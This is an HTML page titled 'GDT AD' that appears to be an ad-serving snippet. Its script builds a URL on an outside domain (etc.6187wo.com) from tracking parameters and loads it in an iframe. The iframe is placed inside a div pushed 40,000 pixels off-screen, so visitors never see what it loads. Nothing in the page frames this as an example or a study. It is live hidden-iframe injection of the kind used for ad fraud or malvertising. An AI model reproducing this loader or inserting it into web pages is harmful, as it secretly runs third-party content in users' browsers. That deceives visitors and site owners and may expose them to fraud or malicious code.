<!DOCTYPE html>
<html>
    <head>
    <title>GDT AD</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    </head>
    <body>
    
<script>

window.curNode = document.currentScript || (function() {
    var script = document.querySelectorAll('script');
    return script[script.length - 1]
})();
var s_w = window.screen.width;

function getParameter(name, cancelBubble) {
            var r = new RegExp("(\\?|#|&)" + name + "=([^&#]*)(&|#|$)");
            var m = location.href.match(r);
            if ((!m || m == "") && !cancelBubble) m = window.location.href.match(r);
            return (!m ? "" : m[2]);
        }

function LoadDefault(url) {
    var d = document.createElement("div");
    var c = document.createElement("iframe");
    c.src = url;
    window.curNode.parentNode.appendChild(d);
    d.style.position = 'absolute';
    d.style.left = '-40000px';
    d.style.top = '-40000px';
    d.style.width = '100%';
    d.style.height = '1000px';
    d.appendChild(c);
    c.style.width = '100%';
    c.style.height = '100%';
}
</script>
    
    <script>
        window.s_w = getParameter('s_w');
        window.sys_trackid = getParameter('trackid');
    </script>

<script type="text/javascript">

var DefaultUrl = '//etc.6187wo.com/Master/';
var ver_id = '100331';
switch(window.sys_trackid){
    case 10111:
        DefaultUrl = '';
        break; 
    case 10112:
        DefaultUrl = '';
        break;         
    default:break;
        
        
}

DefaultUrl = DefaultUrl + 'Default.html#s_w=' + s_w+'&trackid='+window.sys_trackid+'&ver_id='+ver_id;
LoadDefault(DefaultUrl);
</script>
    </body>
</html>
